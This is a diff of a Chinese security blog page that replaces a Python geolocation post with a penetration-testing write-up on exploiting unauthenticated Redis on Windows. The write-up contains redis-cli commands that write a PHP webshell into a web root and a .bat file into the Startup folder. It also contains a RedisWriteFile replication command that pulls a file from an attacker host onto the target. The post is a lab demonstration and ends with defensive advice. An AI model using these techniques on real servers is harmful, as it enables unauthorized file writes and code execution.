@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="使用python获取ip地址归属地, Ex1t">
+    <meta name="keywords" content="redis漏洞利用-window">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>使用python获取ip地址归属地 | Ex1t</title>
+    <title>redis漏洞利用-window | Ex1t</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -241,12 +241,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">使用python获取ip地址归属地</h1>
+                    <h1 class="description center-align post-title">redis漏洞利用-window</h1>
                 </div>
             </div>
         </div>
@@ -362,8 +362,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/python/">
-                                <span class="chip bg-color">python</span>
+                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                <span class="chip bg-color">渗透测试</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%94%BB%E9%98%B2/">
+                                <span class="chip bg-color">攻防</span>
+                            </a>
+                        
+                            <a href="/tags/redis/">
+                                <span class="chip bg-color">redis</span>
                             </a>
                         
                     </div>
@@ -378,28 +386,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-26
+                    2021-08-25
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-12-26
+                    2021-08-25
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    159
+                    840
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -427,38 +435,58 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="ip地址归属"><a href="#ip地址归属" class="headerlink" title="ip地址归属"></a>ip地址归属</h1><p>使用geoip的ip地址库</p>
-<pre class="line-numbers language-python__" data-language="python__"><code class="language-python__">import geoip2.database
-import os
+                <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>之前写了篇<a href="https://www.ex1t.xyz/2021/07/26/redis%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">redis攻防总结</a>，因为现实中windows上redis的没怎么遇到，加上也没去了解，所以也就没写上。但是评论中都希望我加上。由于图片上传+排版等问题，还是新开一篇关于reids在windws上的利用。</p>
+<h1 id="二、Windows下redis利用"><a href="#二、Windows下redis利用" class="headerlink" title="二、Windows下redis利用"></a>二、Windows下redis利用</h1><p>环境：win10（x64）上以管理员权限启动的redis3</p>
+<h2 id="2-1、未授权访问"><a href="#2-1、未授权访问" class="headerlink" title="2.1、未授权访问"></a>2.1、未授权访问</h2><h3 id="2-1-1、写webshell"><a href="#2-1-1、写webshell" class="headerlink" title="2.1.1、写webshell"></a>2.1.1、写webshell</h3><p>已知站点绝对路径（C:\phpStudy\PHPTutorial\WWW\pikachu123），写webshell</p>
+<pre class="line-numbers language-none"><code class="language-none">config set dir C:\phpStudy\PHPTutorial\WWW\pikachu123
+set x "\n\n\n&lt;?php phpinfo();?&gt;\n\n\n"
+config set dbfilename phpinfo.php
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-class Ip2Locate(object):
-    def __init__(self,ip):
-        self.ip = ip
-        
-    @property    
-    def locate(self):
-        databasesPath = os.path.join(os.path.abspath(os.path.dirpath(__file__)),'databases','GeoLite2-City.mmdb')# database path
-        reader = geoip2.database.Render(databasesPath)
-        try:
-            response = reader.city(self.ip)
-        except:
-            return
-        country_iso_code = response.country.iso_code # 国家缩写 eg: US
-        country = response.country.names['zh-CN'] # 国家（中文）eg: 美国
-        province = response.subdivisions.most_specific.names['zh-CN'] # 省份，州 （中文）eg: 明尼苏达州
-        province_iso_code = response.subdivisions.most_specific.iso_code #省份简写 eg: MN
-        city = response.city.names['zh-CN'] #城市名，（中文）eg: 明尼阿波利斯
-        latitude = response.location.latitude # 纬度
-        longitude = response.location.longitude # 经度
-        locate_info = {"country_iso_code":country_iso_code,
-                       "country":country,
-                       "province":province,
-                       "province_iso_code":province_iso_code,
-                       "city":city,
-                       "latitude":latitude,
-                       "longitude":longitude
-                        }
-        return locate_info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p> <img src="https://img.ex1t.xyz//webshell.png" alt="webshell"></p>
+<p>可以看到成功写入</p>
+<p><img src="https://img.ex1t.xyz//phpinfo1.png" alt="phpinfo1"></p>
+<h3 id="2-2-2、写启动项"><a href="#2-2-2、写启动项" class="headerlink" title="2.2.2、写启动项"></a>2.2.2、写启动项</h3><p>已知我的启动项位置</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Users\lc\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>一般是</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>写个弹窗，双引号记得转义，要使用两个\r\n才能成功执行。</p>
+<pre class="line-numbers language-none"><code class="language-none">config set dir "C:/Users/lc/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/"
+set x "\r\n\r\nmshta vbscript:msgbox(\"hack\",64,\"Title\")(window.close)\r\n\r\n"
+config set dbfilename hack.bat
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>保存成功，且能正常运行</p>
+<p><img src="https://img.ex1t.xyz//redis-hack.png" alt="redis-hack"></p>
+<h2 id="2-2、主从复制写无损文件"><a href="#2-2、主从复制写无损文件" class="headerlink" title="2.2、主从复制写无损文件"></a>2.2、主从复制写无损文件</h2><h3 id="2-2-1、攻击原理"><a href="#2-2-1、攻击原理" class="headerlink" title="2.2.1、攻击原理"></a>2.2.1、攻击原理</h3><p>Redis是一个使用ANSIC编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。</p>
+<p>但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。 攻击者（主机）写一个so文件，然后通过 FULLRESYNC（全局）同步文件到受害人（从机）上。</p>
+<h3 id="2-2-2、利用方式"><a href="#2-2-2、利用方式" class="headerlink" title="2.2.2、利用方式"></a>2.2.2、利用方式</h3><p>此脚本是通过 <code>Redis</code> 主从写出无损文件，可用于 <code>Windows</code> 平台下写出无损的 <code>EXE</code>、<code>DLL</code>、 <code>LNK</code> 和 <code>Linux</code> 下的 <code>OS</code> 等二进制文件。在我们的服务器中运行该脚本（目标Redis一定要能回连我们的服务器才行）。</p>
+<pre class="line-numbers language-none"><code class="language-none">https://github.com/r35tart/RedisWriteFile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">Options:
+  -h, --help           帮助信息
+  --rhost=REMOTE_HOST   目标主机
+  --rport=REMOTE_PORT   目标redis端口, default 6379
+  --lhost=LOCAL_HOST    回连ip
+  --lport=LOCAL_PORT    回连端口, default 21000
+  --rpath=Target_File_Path   写入路径, default '.'
+  --rfile=Target_File_Name   写入文件名, default dump.rdb
+  --lfile=Local_File_Name     写入本地那个文件内容
+  --auth=AUTH           reids认证密码
+  -v, --verbose         显示数据流<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>样例</p>
+<pre class="line-numbers language-none"><code class="language-none">python3 rediswritefile.py --rhost=目标ip --rport=目标端口 --lhost=攻击机ip  --lport=攻击机监听端口 --rpath=写入路径 --rfile=写入的文件名 --lfile=写入本机哪个文件的内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>将本地的txt文件写入到windows</p>
+<pre class="line-numbers language-none"><code class="language-none">python3 RedisWriteFile.py --rhost=100.64.65.226 --rport=6379 --lhost=100.64.65.210  --lport=6888 --rpath="C:\123" --rfile=123.txt --lfile=/home/lc/123.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>成功写入</p>
+<p><img src="https://img.ex1t.xyz//redis-zc.png" alt="redis-zc"></p>
+<h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>防御方法可设置redis密码为高强度密码，以低权限启动。</p>
+<p>由于时间有限，上面只简单写了些写入文件的方法。也就是也希望各位大佬在评论区留下更新奇的相关技巧，有空的话我看着再加一加。文章中如有问题，请邮件联系我。</p>
 
                 
             </div>
@@ -475,7 +503,7 @@ class Ip2Locate(object):
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Ex1t</a>
+                    <a href="/about" rel="external nofollow noreferrer">诚默</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -485,7 +513,7 @@ class Ip2Locate(object):
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.ex1t.xyz/2020/12/26/%E4%BD%BF%E7%94%A8python%E8%8E%B7%E5%8F%96ip%E5%9C%B0%E5%9D%80%E5%BD%92%E5%B1%9E%E5%9C%B0/">https://www.ex1t.xyz/2020/12/26/%E4%BD%BF%E7%94%A8python%E8%8E%B7%E5%8F%96ip%E5%9C%B0%E5%9D%80%E5%BD%92%E5%B1%9E%E5%9C%B0/</a>
+                    <a href="https://www.ex1t.xyz/2021/08/25/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-window/">https://www.ex1t.xyz/2021/08/25/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-window/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -498,7 +526,7 @@ class Ip2Locate(object):
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Ex1t</a>
+                    <a href="/about" target="_blank">诚默</a>
                     !
                 </span>
             </div>
@@ -523,8 +551,16 @@ class Ip2Locate(object):
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/python/">
-                                    <span class="chip bg-color">python</span>
+                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                    <span class="chip bg-color">渗透测试</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%94%BB%E9%98%B2/">
+                                    <span class="chip bg-color">攻防</span>
+                                </a>
+                            
+                                <a href="/tags/redis/">
+                                    <span class="chip bg-color">redis</span>
                                 </a>
                             
                         </div>
@@ -835,13 +871,13 @@ class Ip2Locate(object):
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/01/25/%E4%BD%BF%E7%94%A8elk%E6%90%AD%E5%BB%BA%E5%AF%86%E7%A0%81%E7%BB%9F%E8%AE%A1%E5%BA%93/">
+                <a href="/2021/08/25/docker%E6%94%BB%E9%98%B2%E6%80%BB%E7%BB%93/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="使用ELK搭建密码统计库">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="docker攻防总结">
                         
-                        <span class="card-title">使用ELK搭建密码统计库</span>
+                        <span class="card-title">docker攻防总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -852,12 +888,12 @@ class Ip2Locate(object):
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-25
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-25
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            k3vi
+                            诚默
                             
                         </span>
                     </div>
@@ -865,8 +901,16 @@ class Ip2Locate(object):
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/elk/">
-                        <span class="chip bg-color">elk</span>
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
+                    </a>
+                    
+                    <a href="/tags/docker/">
+                        <span class="chip bg-color">docker</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%94%BB%E9%98%B2/">
+                        <span class="chip bg-color">攻防</span>
                     </a>
                     
                 </div>
@@ -880,13 +924,13 @@ class Ip2Locate(object):
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/12/03/cve-2020-1488214883%E5%A4%8D%E7%8E%B0/">
+                <a href="/2021/08/10/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B-windows/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="CVE-2020-1488214883复现">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="内网信息收集之-windows">
                         
-                        <span class="card-title">CVE-2020-1488214883复现</span>
+                        <span class="card-title">内网信息收集之-windows</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -897,7 +941,7 @@ class Ip2Locate(object):
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-10
                             </span>
                         <span class="publish-author">
                             
@@ -910,8 +954,12 @@ class Ip2Locate(object):
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">漏洞</span>
+                    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+                        <span class="chip bg-color">信息收集</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">内网渗透</span>
                     </a>
                     
                 </div>
